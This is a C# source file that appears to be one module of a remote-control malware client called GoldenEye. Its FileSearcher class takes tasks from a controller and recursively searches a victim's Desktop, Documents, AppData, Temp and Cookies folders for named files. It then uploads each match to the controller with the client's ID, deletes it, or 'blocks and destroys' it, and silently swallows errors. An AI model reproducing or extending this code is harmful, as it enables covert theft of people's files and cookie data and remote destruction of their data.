using System;
using System.IO;
using System.Windows.Forms;

namespace GoldenEye.Functions
{
    public class FileSearcher
    {
        public MainWorker mwork;
        public string filename = "";
        public string loc = "";
        public string action = "";
        public string taskid = "";

        public void Start()
        {
            mwork.addinfo("Starting File Searcher - TaskID: " + taskid + " Action: " + action);
            switch (loc)
            {
                case "Desktop":
                    WalkDirRecursive(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory).ToString(), filename);
                    break;

                case "Documents":
                    WalkDirRecursive(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments).ToString(), filename);
                    break;

                case "Pictures":
                    WalkDirRecursive(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures).ToString(), filename);
                    break;

                case "Videos":
                    WalkDirRecursive(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic).ToString(), filename);
                    break;

                case "Program Data":
                    WalkDirRecursive(Environment.GetEnvironmentVariable("PROGRAMDATA").ToString(), filename);
                    break;

                case "Program Files":
                    WalkDirRecursive(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToString(), filename);
                    break;

                case "Appdata Local":
                    WalkDirRecursive(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString(), filename);
                    break;

                case "Appdata Roaming":
                    WalkDirRecursive(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString(), filename);
                    break;
                case "Temp Folder":
                    WalkDirRecursive(Path.GetTempPath().ToString(), filename);
                    break;

                case "Cookies Folder":
                    WalkDirRecursive(Environment.GetFolderPath(Environment.SpecialFolder.Cookies).ToString(), filename);
                    break;
            }
        }

        private FileManager fm3 = new FileManager();

        private void WalkDirRecursive(string vPath, string filename)
        {
            try
            {
                System.IO.DirectoryInfo vDirInfo = new System.IO.DirectoryInfo(vPath);

                foreach (string fname in System.IO.Directory.GetFiles(vDirInfo.FullName))
                {
                    if (fname.Contains(filename))
                    {
                        if (!fname.Contains(Application.StartupPath))
                            mwork.addlog("File Searcher [TaskID " + taskid + "] Found File at: " + fname);
                        if (action.Equals("Download"))
                        {
                            string sendback = fm3.dlFile(fname);
                            mwork.Send("fmXdlfile|" + sendback + "|" + Path.GetFileName(fname) + "|" + mwork.ClientID + "|" + "File Searcher");
                        }
                        else if (action.Equals("Delete"))
                        {
                            try
                            {
                                File.Delete(fname);
                                mwork.addinfo("File Searcher [TaskID " + taskid + "] Deleted File: " + fname);
                            }
                            catch
                            {
                                mwork.adderror("File Searcher [TaskID " + taskid + "] Couldnt delete File: " + fname);
                            }
                        }
                        else if (action.Equals("Block and Destroy"))
                        {
                            FileManager fmgrr = new FileManager();
                            fmgrr.blockfile(fname);
                            mwork.addinfo("File Searcher [TaskID " + taskid + "] Blocked and Destroyed File: " + fname);
                        }
                    }
                }

                foreach (string vSubDir in System.IO.Directory.GetDirectories(vDirInfo.FullName))
                    WalkDirRecursive(vSubDir, filename);
            }
            catch { }
        }
    }
}